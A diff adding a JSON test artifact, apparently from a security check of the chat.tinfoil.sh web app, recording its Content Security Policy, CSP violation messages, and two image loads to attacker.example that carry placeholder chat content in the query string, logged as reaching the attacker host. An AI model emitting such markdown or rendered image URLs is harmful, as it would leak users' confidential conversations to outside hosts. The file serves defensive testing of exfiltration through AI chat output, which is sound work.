@@ -1,0 +1,35 @@
+{
+  "chatCsp": "default-src 'self'; script-src 'self' 'wasm-unsafe-eval'; object-src 'none'; worker-src 'self'; style-src 'self'; font-src 'self' data:; img-src 'self' data: blob: https:; connect-src 'self' data: https://*.tinfoil.sh https://plausible.io https://vitals.vercel-insights.com; frame-src 'self' https://verification-center.tinfoil.sh https://webapp-sandbox.tinfoil.sh https://tinfoil-webapp-sandbox-tinfoil.vercel.app; frame-ancestors https://tinfoil.sh https://www.tinfoil.sh; base-uri 'self'; form-action 'self'; upgrade-insecure-requests",
+  "images": [
+    {
+      "src": "https://attacker.example/img?d=CONFIDENTIAL_CHAT_CONTENT-markdown",
+      "complete": true,
+      "naturalWidth": 1
+    },
+    {
+      "src": "https://attacker.example/img?d=CONFIDENTIAL_CHAT_CONTENT-render_image",
+      "complete": true,
+      "naturalWidth": 1
+    }
+  ],
+  "attackerLog": [
+    {
+      "url": "https://attacker.example/img?d=CONFIDENTIAL_CHAT_CONTENT-markdown",
+      "resourceType": "image",
+      "frame": "https://chat.tinfoil.sh/",
+      "referer": "https://chat.tinfoil.sh/"
+    },
+    {
+      "url": "https://attacker.example/img?d=CONFIDENTIAL_CHAT_CONTENT-render_image",
+      "resourceType": "image",
+      "frame": "https://chat.tinfoil.sh/",
+      "referer": "https://chat.tinfoil.sh/"
+    }
+  ],
+  "cspViolations": [
+    "Applying inline style violates the following Content Security Policy directive 'style-src 'self''. Either the 'unsafe-inline' keyword, a hash ('sha256-sF6TxAaAb",
+    "Applying inline style violates the following Content Security Policy directive 'style-src 'self''. Either the 'unsafe-inline' keyword, a hash ('sha256-sF6TxAaAb",
+    "Applying inline style violates the following Content Security Policy directive 'style-src 'self''. Either the 'unsafe-inline' keyword, a hash ('sha256-b5Ass7kqN",
+    "Applying inline style violates the following Content Security Policy directive 'style-src 'self''. Either the 'unsafe-inline' keyword, a hash ('sha256-aFiOEyAdi"
+  ]
+}
